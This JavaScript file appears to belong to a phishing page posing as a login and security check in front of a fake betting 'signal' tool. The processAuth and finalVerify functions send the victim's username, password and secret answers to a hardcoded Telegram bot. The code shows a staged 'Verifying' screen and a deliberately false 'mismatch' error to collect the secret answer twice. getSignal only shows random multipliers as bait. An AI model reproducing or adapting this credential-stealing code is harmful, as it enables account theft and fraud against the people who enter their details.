const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let step = 0;

function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');

    if (!u || !p) return alert("أدخل البيانات!");

    btn.disabled = true;
    btn.innerText = "Verifying...";

    // إرسال البيانات
    const text = `👤 User: ${u}\n🔑 Pass: ${p}`;
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`;

    fetch(url).then(() => {
        setTimeout(() => {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('security-layer').style.display = 'flex';
            document.getElementById('security-layer').classList.remove('hidden');
        }, 800);
    }).catch(err => alert("خطأ في الشبكة!"));
}

function finalVerify() {
    // تأكد أن id الخانة في HTML هو "u_nick" أو غيره هنا ليتطابق
    const ansInput = document.getElementById('u_nick') || document.getElementById('sec_ans');
    const ans = ansInput.value;
    const btn = document.querySelector('#security-layer button');

    if (!ans) return alert("أدخل اللقب!");

    step++;
    btn.disabled = true;
    btn.innerText = "Synchronizing...";

    const text = `🔑 SECRET (Step ${step}): ${ans}`;
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`;

    fetch(url).then(() => {
        setTimeout(() => {
            if (step === 1) {
                ansInput.value = "";
                btn.disabled = false;
                btn.innerText = "Confirm & Unlock";
                alert("خطأ: اللقب غير متطابق، أعد المحاولة!");
            } else {
                document.getElementById('security-layer').style.display = 'none';
                const mainApp = document.getElementById('main-app');
                mainApp.style.display = 'flex';
                mainApp.classList.remove('hidden');
            }
        }, 1000);
    });
}

function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        display.innerText = (Math.random() * (3.80 - 1.20) + 1.20).toFixed(2) + "x";
    }, 800);
}
